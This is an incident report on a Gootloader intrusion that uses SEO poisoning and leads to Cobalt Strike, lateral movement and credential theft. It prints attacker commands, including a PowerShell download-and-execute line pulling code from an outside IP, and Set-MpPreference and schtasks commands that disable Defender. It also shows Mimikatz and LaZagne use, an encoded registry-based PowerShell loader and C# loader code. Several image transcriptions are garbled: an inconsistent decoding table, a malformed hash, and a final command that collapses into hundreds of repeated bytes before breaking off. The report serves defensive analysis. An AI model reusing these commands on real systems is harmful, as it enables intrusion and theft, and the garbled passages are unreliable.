timestamps in UTC and descriptions of the executed commands, tools used, and affected systems. This structured format allows for easy tracking of the attack progression over two days.\nTranscription: |\n  plaintext\n  SEO Poisoning - A Gootloader Story\n  \n  Day 1\n  \n  14:43 UTC Gootloader Execution\n  - WScript.exe olympus.plex.agreement 34603.js\n  - kaiokok.adspardev.com 35.200.117.64:443\n  - Cobalt Strike loaded into memory\n  - 146.70.78.43:443\n  \n  15:00 UTC Lateral Movement from Beachhead Host to Workstation #1 and Disabling of Defender\n  - Via PowerShell Remote Service\n  - %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADA...\n  - powershell.exe -nop -w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true\n  - 146.70.78.43:443\n  \n  15:34 UTC Antivirus Check on Beachhead Host\n  - WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n  \n  14:58 UTC Discovery via Bloodhound\n  - Invoke-BloodHound -CollectionMethod All\n  \n  15:30 UTC Second Cobalt Strike Server on Workstation #1\n  - 37.120.198.225:443\n  \n  15:44 UTC Mimikatz Execution on Beachhead Workstation\n  - Invoke-Mimikatz\n  \n  15:48 UTC LaZagne Execution on Workstation #1\n  - ls.exe all -oN --output C:\\Users\n  \n  16:05 UTC RDP into Workstation #1 from Beachhead Host\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0\n  - Microsoft Defender Scheduled Tasks Deleted\n  - C:\\Windows\\system32\\schtasks.exe /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\n  \n  16:38 - 17:01 UTC Lateral Movement to Three Additional User Workstations\n  - Remote Service Execution\n  - \\\\WORKSTATION\\ADMIN$\\abb6ca2.exe\n  \n  21:34 UTC RDP into Domain Controller from Beachhead\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - Invoke-WMIMExec -Target DomainController -Domain domain.local -Username USER -Hash \"...\" -Command \"powershell.exe reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0\" -verbose\n  - Microsoft Defender Scheduled Tasks Deleted\n  - Cobalt Strike Powershell payload executed through Powershell via RDP session\n  - LaZagne dropped and executed: ls.exe all -oN --output C:\\Users\n  \n  21:49 UTC RDP into File Share Server from Beachhead\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - Microsoft Defender Scheduled Tasks Deleted\n  - Cobalt Strike Powershell payload executed through Powershell via RDP session\n  \n  21:53 UTC Documents accessed on File Share Server interactively using Wordpad.exe\n  - C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE \"C:\\shares\\STAFFFILE.docx\"\n  \n  Day 2\n  \n  07:36 UTC Advanced IP Scanner used to port scan network from Domain Controller\n  - C:\\Users\\USER\\AppData\\Local\\Temp\\\\\\Advanced IP Scanner 2\\advanced_ip_scanner.exe\n  - Ports: 21,80,135,443,445,3389,8080,56133,58000,58157,58492,58682,60234,60464,64502\n  \n  07:45 UTC File Server SMB Shares accessed from Domain Controller\n  \n  7:54 UTC RDP Connection to Backup Server\n```\n\nAnalysis and reporting completed by @kostastsale, @iiamaleks, @pigerlin.\n\n## Initial Access\n\nThe threat actor gained initial access using Gootloader malware. Here’s a video of the user searching and downloading the malware via the poisoned SEO search.\n\n[GootLoader Download](https://www.youtube.com/embed/IdR-tlv7w48?feature=oembed)\n\nThe Javascript file is then executed when double-clicked after the zip is opened.\n\n```image\nAlt: Execution\nDescription: The image depicts a screenshot of a software interface displaying a Windows Registry Editor. On the left side, there are various folders under the path 'HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username', which include 'Phone', 'ShellUI', 'Pim', 'Poom', 'Remote Assistance', 'ScreenMagnifier', 'Sensors', and 'SkyDrive'. The right side shows a table with registry entries labeled '(default)' and indexed rows (0 to 7), containing values that appear to be obfuscated strings. This information is relevant to the analysis of the execution of Gootloader malware, suggesting a technical aspect of the malware's operation.\n```\n\n## Execution\n\nGootloader upon execution creates two registry keys:\n\n```\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n```\n\nThe first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named `powershell.dll`.\n\n```image\nAlt: Registry Keys\nDescription: The image displays a screenshot of a Windows Registry Editor, showing the registry path 'HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0'. It contains a list of registry values with associated data types and values. The left pane shows the key hierarchy, specifically the 'Phone' key and its subkeys, while the right pane details the values stored in 'Username0', indicating the presence of encoded data related to the Gootloader malware. This is relevant for understanding the malware's execution and persistence mechanisms.\nTranscription: |\n  Key name\n  HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n  \n  Value Name    Value Type    Data\n  (default)     RegSz         \n  0             RegSz         4d5a90000300000004000000ffff0000b8000...\n  1             RegSz         65a6a586d280700002b0d0012037b1b0004a...\n  2             RegSz         00006e282900000a00120209281e00000a7d...\n  3             RegSz         7f01140003004c250000000000086008b011...\n  4             RegSz         64e616d654f7264696e616c730048696e740...\n  5             RegSz         e33320526567697374727920790052656773...\n  6             RegSz         000000000000000000000000000000000000...\n```\n\nFollowing the Registry events, a PowerShell command was launched executing an encoded command.\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a table summarizing key event details related to a cybersecurity incident. It includes columns for 'EventCode', 'TaskCategory', 'ParentCommandLine', and 'CommandLine'. The 'Process Create' event shows the execution of 'C:\\Windows\\System32\\WScript.exe' and a PowerShell command executing a potentially encoded payload from a specified file path.\nTranscription: |\n  plaintext\n  EventCode   TaskCategory       ParentCommandLine                                                                                                          CommandLine\n  1           Process Create     \"C:\\Windows\\System32\\WScript.exe\"                                                                                          \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/e\"\n              (rule:             \"C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\Temp1_olympus plea agreement(46196).zip\\olympus_plea_agreement 34603.js\"            NgAxA\"DQANgA0ADkA\"MgAxADEA0WB\"zAGwAZQBlAHAAIAAtAHMAIAAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"QA\"LQB5AHQ\"AZQBtAFAA\"cg\"B\"vAHAaZQ\"ByA\"HQAeQ\"Ag\"AC0\"AcABh\"AH\"QAaA\n              ProcessCreate)\n```\n\n```\n\"powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/\"e\" NgAxA\"DQANgA0ADkA\"MgAxADEAOwB\"zAGwAZQBlAHAAIAAtAHMAIAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"...\n```\n\nThe PowerShell command will extract the .NET loader from `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0` and execute the code in memory via `Assembly.Load()`.\n\nThis CyberChef recipe can be used to decode the related PS encoded payload.\n\nOnce the PowerShell script is finished running, the next stage involves the .NET loader. The .NET loader will read `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username` and extract the encoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into memory for execution.\n\nA simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.\n\n```\nq->000\nv->0\nw->1\nr->2\nt->3\ny->4\nu->5\ni->6\no->7\np->8\ns->9\nq->A\nh->B\nj->C\nk->D\nl->E\nz->F\n```\n\n```image\nAlt: .NET Loader\nDescription: The image depicts a code snippet written in C#. It outlines a method for reading encoded data from the Windows registry, decoding it, and loading it into memory for execution. The code includes comments and structured sections labeled as '1. Read encoded data from registry,' '2. Decode data,' and '3. Load into memory and run.' The use of specific classes like `RegistryKey` and `Open.DynamicDllLoader` indicates a focus on manipulating system resources, typical in the context of cyber threat intelligence.\nTranscription: |\n  csharp\n  // Token: 0x60000002 RID: 2 RVA: 0x00002104 File Offset: 0x00000304\n  public static string Test()\n  {\n      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\"SOFTWARE\\\\Microsoft\\\\Phone\\\\\" +\n          Environment.UserName);\n      if (registryKey != null)\n      {\n          string text = \"\";\n          for (int i = 0; i < 99999; i++)\n          {\n              string text2 = \"\";\n              try\n              {\n                  text2 = registryKey.GetValue(i.ToString()).ToString();\n              }\n              catch\n              {\n              }\n              if (text2.Length == 0)\n              {\n                  break;\n              }\n              text += text2;\n          }\n          registryKey.Close();\n          \n          // 2. Decode data\n          text = text.Replace(\"q\", \"0\").Replace(\"v\", \"0\").Replace(\"w\", \"1\").Replace(\"r\", \"2\").Replace(\"t\", \"3\").Replace(\"y\", \"4\").Replace(\"u\", \"5\").Replace(\"i\", \"6\").Replace(\"o\", \"7\").Replace(\"p\", \"8\").Replace(\"s\", \"9\").Replace(\"g\", \"A\").Replace(\"h\", \"B\").Replace(\"j\", \"C\").Replace(\"k\", \"D\").Replace(\"l\", \"E\").Replace(\"z\", \"F\");\n          byte[] data = Open.STBA(text);\n          Open.DynamicDllLoader dynamicDllLoader = new Open.DynamicDllLoader();\n          bool flag = dynamicDllLoader.LoadLibrary(data);\n          Console.WriteLine(\"Loaded: \" + flag);\n          if (flag)\n          {\n              uint procAddress = dynamicDllLoader.GetProcAddress(\"mono_trace\");\n              Console.WriteLine(\"Handle: \" + procAddress);\n          }\n      }\n      Console.ReadKey();\n      return \"Install\";\n  }\n```\n\nThe below diagram summarizes the Gootloader initial execution.\n\n```image\nAlt: Execution Summary\nDescription: The image is a flowchart illustrating the execution process of the Gootloader. It outlines the steps involved, starting from the initial execution of the malicious script (`wscript.exe olympus_plea_agreement 34603.js`), which contacts the command and control (C2) servers to retrieve the payload. It details how the Gootloader writes a .NET loader and an encoded Cobalt Strike payload to the registry, and how the PowerShell command is executed to load the .NET loader. The diagram also highlights how the .NET loader subsequently reads and decodes the Cobalt Strike payload from the registry for execution.\nTranscription: |\n  plaintext\n  https://junk-bros.com\n  https://jp.imonitorsoft.com\n  https://kakiosk.adsparkdev.com\n  \n  wscript.exe olympus_plea_agreement 34603.js\n      Gootloader contacts C2 and pulls down payload\n  \n  powershell.exe\n      .NET loader read from registry and loaded in Powershell via Assembly.Load() using an encoded Powershell command\n      The same encoded Powershell command is added as a scheduled task to run on user logon\n  \n  .NET loader and encoded Cobalt Strike payload written to registry\n      .NET Loader -> HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n      Cobalt Strike -> HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\n  \n  .NET Loader\n      .NET loader is executed which reads and decodes a Cobalt Strike payload from the registry\n      .NET loader loads and executes the Cobalt Strike payload\n```\n\nAn excellent resource from Microsoft describes a set of configurations that can be applied to Windows that can stop `.js` files from executing, preventing this attack chain from ever getting off the ground.\n\nDuring later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.\n\n```\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))\"\n```\n\n## Persistence\n\nThe Javascript (Gootloader) file invoked an encoded PowerShell command.\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a log entry or data table showing details of a process creation event related to a PowerShell command. It includes columns for EventCode, TaskCategory, ParentImage, and CommandLine. The CommandLine specifies a PowerShell script execution through the Windows Script Host (wscript.exe), indicating the use of encoded commands. This image provides technical insight into the execution of potentially malicious PowerShell commands, relevant for understanding cyber threats.\nTranscription: |\n  plaintext\n  EventCode: 1\n  TaskCategory: Process Create (rule: ProcessCreate)\n  ParentImage: C:\\Windows\\System32\\wscript.exe\n  CommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/e\" N\"g\"A4\"ADc\"ANgA4\"ADEAMwA7ACQAYQ\"A9ACIA\"TgB\"n\"AEEAeAB\"B\"AE\"Q\"AUQ\"BBAE\"4ZwBBADA\"AQ\"QBEAGsAQQ\"BNAGc\"AQDBA4\"EEARABF\"AE\"E\"AT\"w\"B3A\"ETIAegBB\"AEc\"AdvBBA\"F\"oAUQBC\"AGwA\"Q\"Q\"B\"IAEEAQ\"\n```\n\nThe encoded PowerShell command creates a Scheduled Task that executes when the selected user logs on to the computer. An encoded PowerShell command is executed that will retrieve and execute the payload stored in the Registry.\n\n```\n6876813;\n$a=\"NgAxADQANgA0ADkAMgAxADEAOwBzAGwAZQBlAHAAIAAtAHMAIAA4ADMAOwAkAG8AcABqAD0ARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACgAIgBoAGsAIgArACIAYwB1ADoAXABzAG8AZgAiACsAIgB0AHcAIgArACIAYQByAGUAXABtAGkAYwAiACsAIgByAG8AcwAiACsAIgBvAGYAdABcAFAAaABvAG4AZQBcACIAKwBbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgAoACIAdQBzAGUAIgArACIAcgBuACIAKwAiAGEAbQBlACIAKQArACIAMAAiACkAOwBmAG8AcgAgACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAZQAgADcANgAwADsAJAB1AG8AKwArACkAewBUAHIAeQB7ACQAbQBwAGQAKwA9ACQAbwBwAGoALgAkAHUAbwB9AEMAYQB0AGMAaAB7AH0AfQA7ACQAdQBvAD0AMAA7AHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJAB1AG8AKwArADsAJABrAG8APQBbAG0AYQB0AGgAXQA6ADoAKAAiAHMAcQAiACsAIgByAHQAIgApACgAJAB1AG8AKQA7AGkAZgAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewBiAHIAZQBhAGsAfQB9ACQAeQBsAD0AJABtAHAAZAAuAHIAZQBwAGwAYQBjAGUAKAAiACMAIgAsACQAawBvACkAOwAkAGsAagBiAD0AWwBiAHkAdABlAFsAXQBdADoAOgAoACIAbgBlACIAKwAiAHcAIgApACgAJAB5AGwALgBMAGUAbgBnAHQAaAAvADIAKQA7AGYAbwByACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAdAAgACQAeQBsAC4ATABlAG4AZwB0AGgAOwAkAHUAbwArAD0AMgApAHsAJABrAGoAYgBbACQAdQBvAC8AMgBdAD0AWwBjAG8AbgB2AGUAcgB0AF0AOgA6ACgAIgBUAG8AQgAiACsAIgB5AHQAZQAiACkAKAAkAHkAbAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJAB1AG8ALAAyACkALAAoADIAKgA4ACkAKQB9AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvACIAKwAiAGEAZAAiACkAKAAkAGsAagBiACkAOwBbAE8AcABlAG4AXQA6ADoAKAAiAFQAZQAiACsAIgBzAHQAIgApACgAKQA7ADYAMQAxADgAOQA4ADUANAA0ADsA\";\n```\n\nThe task created from the PowerShell script:\n\n```image\nAlt: Scheduled Task\nDescription: The image displays an XML representation of a scheduled task created by a PowerShell script. The task is set to trigger when a specific user logs on. Key elements include the task's registration information, triggers, settings, actions, and user principal details. The XML schema indicates various properties such as logon type, execution parameters, and security context, which are relevant to the execution of the PowerShell command.\nTranscription: |\n  xml\n  <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n  <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n    <RegistrationInfo>\n      <URI>\\</URI>\n    </RegistrationInfo>\n    <Triggers>\n      <LogonTrigger>\n        <Enabled>true</Enabled>\n        <UserId></UserId>\n      </LogonTrigger>\n    </Triggers>\n    <Settings>\n      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n      <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n      <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n      <AllowHardTerminate>true</AllowHardTerminate>\n      <StartWhenAvailable>false</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n        <Duration>PT10M</Duration>\n        <WaitTimeout>PT1H</WaitTimeout>\n        <StopOnIdleEnd>true</StopOnIdleEnd>\n        <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Enabled>true</Enabled>\n      <Hidden>false</Hidden>\n      <RunOnlyIfIdle>false</RunOnlyIfIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n      <Priority>7</Priority>\n    </Settings>\n    <Actions Context=\"Author\">\n      <Exec>\n        <Command>C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</Command>\n        <Arguments>-w -n -e \n```\n\n## Defense Evasion\n\nWindows Defender scheduled scans were deleted from the system. This was observed on multiple servers the threat actor pivoted to.\n\n```image\nAlt: Windows Defender\nDescription: The image displays a textual output from a process creation log, detailing the execution of the 'schtasks.exe' command. This command was used to delete scheduled tasks related to Windows Defender, indicating a potential evasion of security measures. Key elements include the process ID, command line executed, user information, and hash values for verification. The context suggests this is part of a larger discussion on defense evasion tactics employed by threat actors.\nTranscription: |\n  plaintext\n  \"Process Create:\n  RuleName: technique_id=T1086,technique_name=PowerShell\n  UtcTime:\n  ProcessGuid: {c26db5f6-5adc-61f9-f631-000000000060}\n  ProcessId:  3688\n  Image: C:\\Windows\\System32\\schtasks.exe\n  FileVersion:\n  Description: Task Scheduler Configuration Tool\n  Product: Microsoft Windows Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: schtasks.exe\n  CommandLine: \"C:\\Windows\\system32\\schtasks.exe\" /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\n  CurrentDirectory: C:\\Users\\\n  User:\n  LogonGuid: {c26db5f6-901c-61a3-bdad-030000000000}\n  LogonId: 0x3ABD8\n  TerminalSessionId: 1\n  IntegrityLevel: High\n  Hashes: SHA1=EF173058B6BD8AB7E07C1A56B63A9E504E463D2DA,MD5=8AC868920214321438EABFBDE93BC2,SHA256=1AC5741B075111E49CB1681BD3A00EEF9B03F\n  ParentProcessGuid: {c26db5f6-5aa1-61f9-e731-000000000060}\n  ParentProcessId: 9724\n  ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  ParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"\n```\n\n```\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\n```\n\nFurthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.\n\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableArchiveScanning $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nSet-MpPreference -DisableIntrusionPreventionSystem $true\nSet-MpPreference -DisableScanningNetworkFiles $true\nSet-MpPreference -MAPSReporting 0\nSet-MpPreference -DisableCatchupFullScan $True\nSet-MpPreference -DisableCatchupQuickScan $True\n```\n\nAs in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.\n\n```image\nAlt: Memory Dump\nDescription: The image displays a table containing three rows and three columns. The columns are labeled 'Action Type', 'Initiating Process File Name', and 'Initiating Process Command Line'. Each row corresponds to actions involving the process 'rundll32.exe', detailing the type of action (such as 'RemoteSetThreadContextMemoryExecution' and 'RemoteExecutable MemoryAllocation') performed by or related to this process. This data is relevant to understanding the behavior of the threat actor's tools during a cyber intrusion.\nTranscription: |\n  Action Type                                      Initiating Process File Name    Initiating Process Command Line\n  RemoteSetThreadContextMemoryExecution            rundll32.exe                    rundll32.exe\n  RemoteExecutableMemoryAllocation                 rundll32.exe                    rundll32.exe\n  RemoteExecutableMemoryAllocation                 rundll32.exe                    rundll32.exe\n```\n\nThis can be observed in the memory dump from the beachhead host with the tell-tale `PAGE_EXECUTE_READWRITE` protection settings on the memory space and MZ headers observable in the process memory space.\n\n```image\nAlt: Memory Dump\nDescription: The image is a screenshot of a memory dump, showing hexadecimal machine code and memory addresses related to the execution of `rundll32.exe`. Key elements include indications of `PAGE_EXECUTE_READWRITE` memory protection settings and `MZ` headers, which are characteristic of executable files. The layout consists of lines of code displaying function calls and memory operations, with specific highlights on the memory protection status and executable identifiers.\nTranscription: |\n  08 4a 40 d1 c7 7e 7f 00 00  J...@..~...\n  3420    rundll32.exe          0x3030000    0x3063fff    VadS    PAGE_EXECUTE_READWRITE    52    1    Disabled\n  ...\n  50 52 55 56 57 8b ec 83 ec 0c  MZRE.\n  c3 5a 52 5e 68 00 00 00 00 68  .Z^h....h\n  c3 5a 5f 5d 0f 45 68 00 00 00  .Z_]..Eh...\n  ...\n  0x3030002:    dec    ebp\n  0x3030003:    pop    ecx\n  0x3030004:    push   ebp\n  0x3030005:    inc    ebp\n  0x3030006:    push   0x303009\n  0x303000b:    pop    ebx\n  0x303000c:    add    ebx, ebx\n  0x303000e:    mov    esp, esp\n  0x3030010:    mov    ebp, esp\n  0x3030012:    push   0x7d445\n  0x3030017:    call   0x56a2b5f0\n  ...\n  0x3030021:    push   edi\n  0x3030022:    call   eax\n  0x3030024:    add    byte ptr [eax], al\n  0x3030026:    add    byte ptr [eax], al\n  0x3030028:    add    byte ptr [eax], al\n  0x303002a:    add    byte ptr [eax], al\n  0x303002c:    add    byte ptr [eax], al\n  0x303002e:    add    byte ptr [eax], al\n  0x3030030:    add    byte ptr [eax], al\n  0x3030032:    add    byte ptr [eax], al\n  0x3030034:    add    byte ptr [eax], al\n  0x3030036:    add    byte ptr [eax], al\n  0x3030038:    add    byte ptr [eax], al\n  3420    rundll32.exe          0x3260000    0x329dfff    VadS    PAGE_EXECUTE_READWRITE    62    1    Disabled\n  ...\n  50 52 55 56 57 8b ec 83 ec 0c  MZRE.\n  c3 5a 52 5e 68 00 00 00 00 68  .Z^h....h\n  c3 5a 5f 5d 0f 45 68 00 00 00  .Z_]..Eh...\n  ...\n  0x3260001:    pop    edx\n  0x3260002:    dec    ebp\n  0x3260003:    pop    ecx\n  0x3260004:    push   ebp\n  0x3260005:    inc    ebp\n  0x3260006:    push   0x3260009\n  0x326000b:    pop    ebx\n  0x326000c:    add    ebx, ebx\n  0x326000e:    mov    esp, esp\n  0x3260010:    mov    ebp, esp\n  0x3260012:    push   0x7d445\n  0x3260017:    call   0x56a2b5f0\n  ...\n  0x3260021:    push   edi\n  0x3260022:    call   eax\n  0x3260024:    add    byte ptr [eax], al\n  0x3260026:    add    byte ptr [eax], al\n  0x3260028:    add    byte ptr [eax], al\n  0x326002a:    add    byte ptr [eax], al\n  0x326002c:    add    byte ptr [eax], al\n  0x326002e:    add    byte ptr [eax], al\n  0x3260030:    add    byte ptr [eax], al\n  0x3260032:    add    byte ptr [eax], al\n  0x3260034:    add    byte ptr [eax], al\n  0x3260036:    add    byte ptr [eax], al\n  0x3260038:    add    byte ptr [eax], al\n  7132    rundll32.exe          0xa700000    0xa90fff    VadS    PAGE_EXECUTE_READWRITE    33    1    Disabled\n  ...\n  4d 5a 90 00 03 00 00 00 04 00  MZARUH.\n  bd 1f 4c ef 20 00 00 00 00 00  ..L. ....\n  ...\n  a8 81 c1 f2 00 00 00 00 00 00  ..........\n  ...\n  03 5a 6f f1 01 48 00 00 00 00  .Zo..H....\n  ...\n  5a ff d3 00 00 00 00 00 00 00  Z.........\n  0xa700000:    pop    r10\n```\n\nDuring the intrusion, we observed various named pipes utilized by the threat actor’s Cobalt Strike beacons including default Cobalt Strike named pipes.\n\n```\nPipeName: \\msagent_ld\nPipeName: \\1ea887\n```\n\nThe threat actors were observed making use of double encoded Powershell commands. The first layer of encoding contains Hexadecimal and XOR encoding.\n\n```image\nAlt: Encoded Powershell\nDescription: The image displays a detailed output from a PowerShell process creation event. It includes various technical attributes such as the Process GUID, Process ID, image path, file version, description, and command line used. The command line contains obfuscated code involving hexadecimal values, indicating potential malicious intent. Additionally, it lists user information, terminal session ID, integrity level, and hash values related to the process, showcasing the technical details of the executed PowerShell command.\nTranscription: |\n  plaintext\n  \"Process Create:\n  RuleName: technique_id=T1086,technique_name=PowerShell\n  UtcTime: \n  ProcessGuid: {bb28eb5f-a41e-61f9-8445-000000000508}\n  ProcessId: 6268\n  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  FileVersion: \n  Description: Windows PowerShell\n  Product: Microsoft Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: PowerShell.EXE\n  CommandLine: powershell -nop -non -ep bypass -w h -c \"&([scriptblock]::Create(([0x34,0x73,0x2d,0x5e,0x75,0x67,0x3d,0x5f,0x72,0x7a,0x75,0x6d,0x64,0x30,0x53,0x7f,0x7d,0x7c,0x3e,0x43,0x75,0x62,0x66,0x75,0x6f,0x2c,0x8d,0x7c,0x58,0x64,0x64,0x6e,0x75,0x6e,0x38,0x37,0x55,0x44,0x3c,0x37,0x8c,0x37,0x68,0x74,0x68,0x6e,0x43,0x75,0x6f,0x75,0x6d,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6